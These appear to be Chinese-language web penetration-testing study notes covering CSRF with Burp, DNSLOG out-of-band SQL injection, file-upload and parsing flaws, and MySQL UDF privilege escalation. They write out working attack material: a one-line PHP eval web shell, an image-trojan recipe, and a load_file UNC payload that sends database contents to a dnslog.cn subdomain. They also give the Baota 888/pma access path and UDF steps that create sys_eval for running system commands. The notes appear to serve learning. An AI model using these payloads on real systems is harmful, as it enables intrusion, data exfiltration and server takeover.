# CSRF跨站伪造请求

> **待办事项**
>
> - [ ] CSRF PoC是什么？

- 攻击过程

1. 存储请求

2. 触发请求

- 通过**burp**截获客户端发送修改请求的数据包，然后使用**burp**自带工具**CSRF PoC**生成CSRF攻击，也就是将请求保存下来，再通过这个工具重新回到网站伪造请求对该用户的数据进行修改。

  `test.php?DE=PHPINFO();`

- 网站后台：上传文件漏洞，上传木马，获取网站操作权限

# DNSLOG注入

> 漏洞利用：
>
> dns解析地址的时候会将别人询问的域名记录下来。



​	首先，先了解一下**盲注**是什么：向服务器问问题。比如说下面这个语句，就是在`url`后面的参数中传递这样一串sql语句，如果返回的没有内容或者是错误，那这个服务器的数据库名称不是以k开头的。

```mysql
select * from news where id=1 and substr(database(),1,1)='k'
```

如果像上面这个一个一个的问，那会很麻烦。

**oob：out of band **数据外带

- **实例分析**

在`dnslog.cn`中显示管理员密码

1. 查数据库的库名:`select database();`

2. 拼接`concat：select concat('b','a');`->显示ba

子查询：`concat((select database()),'.d0vag1.dnslog.cn');`

3. 让目标访问构造的域名

`load_file('//C:/target/.../1.txt') 使用unc路径//`

读取文件内容，本地与远程都ok

最终结果:

```mysql
load_file(concat('//',(select database()),'.域名/1.txt'));
select hex(password) from admin limit 1,1
```

使用hex编码的目的是为了区分传来数字的大小写

 # 文件解析漏洞

> 待办事项
>
> - [ ] src？？应急响应中心：应付甲方
> - [ ] 用什么解析，找到什么漏洞，怎么利用的。
>
> - [ ] 你测过什么漏洞？？？

- **web shell**

  web的含义是需要服务器开放web服务；shell是一个人机交互界面

  木马可以帮助拿到shell，以达到控制网站服务器的目的。

  执行从用户那边取得的信息：

  `<?php @eval($_REQUEST[test]) ?>`

- **shell管理工具**：中国菜刀，中国蚁剑，冰蝎

- **上传木马**：找一个上传点，将木马传入到目标服务器。木马的作用是在目标服务器中为我们提供想要的内容。木马以某种形式保存到目标机器

- 木马生效是因为解析：asp cer asa asmx svc png/.php

> 上传绕过、找规则、限制类型、上传规则、保存规则、规律规则

- **图片马**：`COPY 1.png/b+a.php b.png`

  `b.png`中已经被注入木马

- **phpStudy nginx 漏洞解析**：`123.png/.php?a=phpinfo()`将图片当成`.php`文件进行解析，双击电脑编程服务器，并且安装数据库。

> 端口：3306 密码：rootroot

- **phpmyadmin 写马**

  图片被上传到服务器的过程中被使用base64编码



# UDF提权

> 数据库提权
>
> exp：漏洞利用脚本 smbv3 exploit-db.com
>
> 有用的网站：i.zkaq.org

- 如何提权：内核漏洞 借助高权限

- 列出运行的服务：tasklist -svc

- **实例分析**

下面演示如何进入宝塔`phpadmin`进行数据库提权，执行系统命令进行权限提取。

宝塔 888/pma漏洞：`ip或域名:888/pma`可直接进入`phpMyadmin`，从而进行数据库修改。

1. **判断服务器版本**：

```mysql
select @@version_compile_os ,@@version_compile_machine,@@version;
select @@plugin_dir;
```

2. **udf.dll**

   如何获取：

   - sqlmap中获取：已经加密的

   - github搜索

   如何处理：(加密成16进制)

   1. 命令行执行：

      `certutil -encodehex -f -v udf32.dll w32x.txt 4`

   2. 数据库处理：

      ```mysql
      select hex(load_file('l64.so'))  into dumpfile  'l64.hex'
      ```

      - `outfile`:有格式的转换  `dumpfile`：原始数据格式

      - 转换的十六进制文件有空格和换行，需要将空格和换行去掉

3. **写入文件**

   `select 十六进制文件 into dumpfile ‘路径加文件名’`

4. **生成函数**

   ```mysql
   create function sys_eval returns string soname '1.so'；
   ```

5. **验证**

   ```mysql
   select * from mysql.func where name='sys_eval';
   select sys_eval('ls /')
   ```

   







